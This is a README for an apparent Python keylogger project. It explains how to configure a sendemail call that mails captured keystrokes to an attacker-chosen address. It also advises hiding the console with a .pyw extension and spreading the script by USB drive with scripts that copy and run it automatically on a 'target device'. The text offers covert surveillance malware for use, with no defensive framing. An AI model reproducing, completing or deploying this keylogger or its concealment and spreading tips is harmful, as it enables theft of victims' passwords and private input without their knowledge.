# python-keylogger


### Prerequisites
The script needs the python package ```pynput``` to be installed and a ```json.txt``` file at the same folder. The keystrokes are saved in the file.

The following parts need to be filled out. At the ```printit``` method:

```
sendemail(from_addr = FROM_ADDR, to_addr_list = [TO_ADDR], cc_addr_list = [CC_ADDR], subject = 'Update', message = '\n'+ msg, login=EMAIL_USERNAME, password = EMAIL_PASSWORD)
```

- ```FROM_ADDR``` needs to be the email address that you will be sending the emails from
- ```TO_ADDR``` needs to be the email address/addresses that you are sending the emails too
- ```CC_ADDR``` is the same
- ```login``` is your email's login username
- ```password``` is the password you use for logging in the email

### Extra stuff you could do
- Change the extension to ```.pyw``` to hide the console/terminal when executing
- Add shebang and proper file permissions when using on Linux machines
- Download the ```pynput``` package and put the package's folder at the same folder as the script and place them in a USB drive.
  You can then write scripts to automatically copy and execute the script on the target device.

Know that the script isn't complete and be prepared to face some bugs. I haven't experienced any yet.
